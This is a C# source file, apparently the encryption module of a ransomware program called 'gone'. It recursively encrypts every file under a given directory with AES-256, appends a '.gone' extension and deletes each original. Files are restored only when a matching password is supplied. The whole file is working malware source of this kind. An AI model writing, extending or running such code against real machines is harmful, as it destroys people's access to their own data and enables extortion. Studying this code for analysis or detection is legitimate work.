using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace gone;

internal class Encrypt
{
	public static int encryptedCount = 0;

	private static string fExtension = ".gone";

	public static string fPassword = Program.DECRYPT_PASSWORD;

	public static string inPassword;

	public static List<string> encryptedFileLog = new List<string>();

	public static void EncryptContent(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (!text.Contains(fExtension))
				{
					Console.WriteLine("Encrypting: " + text);
					encryptedFileLog.Add(text);
					EncryptFile(text, fPassword);
				}
			}
			files = Directory.GetDirectories(path);
			for (int i = 0; i < files.Length; i++)
			{
				EncryptContent(files[i]);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static void DecryptContent(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (IsEncrypted(text))
				{
					Console.WriteLine("Decrypting: " + text);
					DecryptFile(text, text.Substring(0, text.Length - fExtension.Length), inPassword);
				}
			}
			files = Directory.GetDirectories(path);
			for (int i = 0; i < files.Length; i++)
			{
				DecryptContent(files[i]);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static bool IsEncrypted(string file)
	{
		if (file.Contains(fExtension) && file.Substring(file.Length - fExtension.Length, fExtension.Length) == fExtension)
		{
			return true;
		}
		return false;
	}

	private static void EncryptFile(string filePath, string password)
	{
		byte[] array = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		rNGCryptoServiceProvider.Dispose();
		FileStream fileStream = new FileStream(filePath + fExtension, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(filePath, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
		finally
		{
			Console.WriteLine("Encypted " + filePath);
			encryptedCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(filePath);
		}
	}

	private static void DecryptFile(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine(ex2.Message);
		}
		try
		{
			cryptoStream.Close();
			Console.WriteLine("Decrypted: " + inputFile);
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}
}
